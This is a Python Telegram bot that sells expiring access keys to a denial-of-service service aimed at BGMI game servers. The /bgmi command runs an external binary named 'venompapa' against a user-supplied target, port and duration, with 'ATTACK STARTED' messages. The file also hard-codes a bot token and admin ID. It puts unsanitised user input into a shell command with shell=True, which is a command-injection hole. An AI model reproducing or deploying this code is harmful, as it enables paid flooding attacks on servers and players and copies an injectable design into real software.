import telebot
import subprocess
import datetime
import os
import random
import string
import json

# Insert your Telegram bot token here
bot = telebot.TeleBot('7550987469:AAEjXOHykyun6sv4YhNF2lLTz2NknF-G15U')

# Admin user IDs
admin_id = {"6830887977"}

# File to store allowed user IDs and expiration dates
USER_FILE = "users.json"

# File to store command logs
LOG_FILE = "log.txt"

# File to store keys
KEY_FILE = "keys.json"

# Cooldown time for users
COOLDOWN_TIME = 300  # 5minutes

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users(users):
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys(keys):
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "🗑️Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def generate_key(length=16):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_days_to_current_date(days):
    return (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')

@bot.message_handler(commands=['generatekey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            try:
                days = int(command[1])
                key = generate_key()
                expiration_date = add_days_to_current_date(days)
                keys = read_keys()
                keys[key] = expiration_date
                save_keys(keys)
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number of days."
        else:
            response = "Usage: /generatekey <days>"
    else:
        response = "🫅ONLY OWNER CAN USE🫅"

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeemkey'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        keys = read_keys()
        if key in keys:
            expiration_date = keys[key]
            users = read_users()
            users[user_id] = expiration_date
            save_users(users)
            del keys[key]
            save_keys(keys)
            response = f"✅Key redeemed successfully! Access granted until: {expiration_date}"
        else:
            response = "Invalid or expired key."
    else:
        response = "Usage: /redeemkey <key>"

    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    users = read_users()
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() <= expiration_date:
            if user_id not in admin_id:
                if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                    response = f"You are on cooldown. Please wait {COOLDOWN_TIME // 300} 5minutes before running the /bgmi command again."
                    bot.reply_to(message, response)
                    return
                bgmi_cooldown[user_id] = datetime.datetime.now()

            command = message.text.split()
            if len(command) == 4:
                target = command[1]
                try:
                    port = int(command[2])
                    time = int(command[3])
                    if time > 300:
                        response = "⚠️Error: Time interval must be less than 300 seconds."
                    else:
                        record_command_logs(user_id, '/bgmi', target, port, time)
                        log_command(user_id, target, port, time)
                        start_attack_reply(message, target, port, time)

                        # Set permission for attack script
                        subprocess.run("chmod +x venompapa", shell=True)
                        
                        # Run the attack
                        full_command = f"./venompapa {target} {port} {time} 360"
                        subprocess.run(full_command, shell=True)

                        response = f"🎮BGMI Attack Finished🎮 Target: {target} Port: {port} Time: {time}"
                except ValueError:
                    response = "Error: Port and time must be integers."
            else:
                response = "✅Usage: /bgmi <target> <port> <time>"
        else:
            response = "❌Your access has expired. Please redeem a new key❌"
    else:
        response = "🚫You are not authorized to use this command🚫"

    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 🔥🔥ATTACK STARTED.🔥🔥\n\n🎯Target: {target}\n🚪Port: {port}\n⏳Time: {time} Seconds\nMethod: FAITH-VIP"
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

# Rest of your commands...

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
